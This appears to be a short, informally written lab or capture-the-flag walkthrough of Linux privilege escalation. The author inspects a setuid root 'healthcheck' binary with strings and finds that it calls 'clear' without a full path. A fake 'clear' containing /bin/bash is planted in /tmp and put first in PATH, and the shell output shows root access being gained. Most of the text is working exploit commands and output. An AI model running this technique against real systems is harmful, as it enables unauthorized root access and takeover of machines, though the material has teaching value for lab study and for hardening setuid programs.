sgid exploiting....


-rwsr-sr-x 1 root   root       5.7K Jul 29  2020 /usr/bin/healthcheck

sudo sgid permission mens this script is running under the root privilages...




[almirant@localhost tmp]$ strings /usr/bin/healthcheck 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h





since we've the sgid on it that mean,we can create a binary named as clear in temp directory and append "/bin/bash" in it and 
set the permission of +x executable and change the envirement path ....

and the execute the script ....as it is running as root it will run ourt binary clear: which has /bin/bas as root we will scape form our shell to 
root use.

follow along to do this.






[almirant@localhost tmp]$ echo "/bin/bash" >clear
[almirant@localhost tmp]$ ls
clear       gpg-2nlObz/  init.vQ5ZLd  setup_dump.sql
ddebug.log  gpg-ycbRQr/  linpeas.sh
[almirant@localhost tmp]$ cat clear 
/bin/bash
[almirant@localhost tmp]$ chmod +x clear 
[almirant@localhost tmp]$ PATH=/tmp:$PATH
[almirant@localhost tmp]$ echo $path

[almirant@localhost tmp]$ echo $PATH
/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
[almirant@localhost tmp]$ /usr/bin/he
head         healthcheck  hexdump      
[almirant@localhost tmp]$ /usr/bin/healthcheck 
[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),502(almirant)
[root@localhost tmp]# whoami
root

